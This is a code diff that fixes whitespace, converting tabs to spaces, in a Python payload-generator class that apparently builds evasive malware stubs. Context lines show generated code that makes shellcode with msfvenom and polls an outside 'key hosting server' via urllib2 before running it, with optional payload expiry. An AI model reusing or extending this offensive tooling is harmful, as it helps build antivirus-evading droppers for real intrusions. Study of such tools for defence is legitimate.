@@ -155,8 +155,8 @@ class Payload:
                 PayloadCode += 'import time\n'
                 PayloadCode += 'import md5\n'
                 PayloadCode += 'import urllib2\n'
-		PayloadCode += 'opener = urllib2.build_opener()\n'
-		PayloadCode += 'opener.addheaders' + ' = ' '[('+ USER_AGENT +'\')]' '\n'
+                PayloadCode += 'opener = urllib2.build_opener()\n'
+                PayloadCode += 'opener.addheaders' + ' = ' '[('+ USER_AGENT +'\')]' '\n'
                 # Define Target Server "Key hosting server"
                 PayloadCode += RandKeyServer + ' = ' '"'+ TARGET_SERVER +'"' '\n'
                 PayloadCode += 'while True:\n'
@@ -289,9 +289,9 @@ class Payload:
                 PayloadCode += 'import time\n'
                 PayloadCode += 'import md5\n'
                 PayloadCode += 'import urllib2\n'
-		PayloadCode += 'opener = urllib2.build_opener()\n'
-		PayloadCode += 'opener.addheaders' + ' = ' '"'+ USER_AGENT +'"' '\n'                
-		# Define Target Server "Key hosting server"
+                PayloadCode += 'opener = urllib2.build_opener()\n'
+                PayloadCode += 'opener.addheaders' + ' = ' '"'+ USER_AGENT +'"' '\n'                
+                # Define Target Server "Key hosting server"
                 PayloadCode += RandKeyServer + ' = ' '"'+ TARGET_SERVER +'"' '\n'
                 PayloadCode += 'while True:\n'
                 PayloadCode += ' try:\n'
@@ -337,7 +337,7 @@ class Payload:
             if self.required_options["EXPIRE_PAYLOAD"][0].lower() == "x":
                 TARGET_SERVER = str(self.required_options["TARGET_SERVER"][0])
                 target_html_file = str(TARGET_SERVER.split('/')[-1])
-		USER_AGENT = "User-Agent: " + self.required_options['USER_AGENT'][0]
+                USER_AGENT = "User-Agent: " + self.required_options['USER_AGENT'][0]
                 # Generate Shellcode Using msfvenom
                 Shellcode = self.shellcode.generate()
 
@@ -424,9 +424,9 @@ class Payload:
                 PayloadCode += 'import time\n'
                 PayloadCode += 'import md5\n'
                 PayloadCode += 'import urllib2\n'
-		PayloadCode += 'opener = urllib2.build_opener()\n'
-		PayloadCode += 'opener.addheaders' + ' = ' '"'+ USER_AGENT +'"' '\n'            
-		PayloadCode += 'from datetime import datetime\n'
+                PayloadCode += 'opener = urllib2.build_opener()\n'
+                PayloadCode += 'opener.addheaders' + ' = ' '"'+ USER_AGENT +'"' '\n'            
+                PayloadCode += 'from datetime import datetime\n'
                 PayloadCode += 'from datetime import date\n\n'
                 # Define Target Server "Key hosting server"
                 PayloadCode += RandKeyServer + ' = ' '"'+ TARGET_SERVER +'"' '\n'
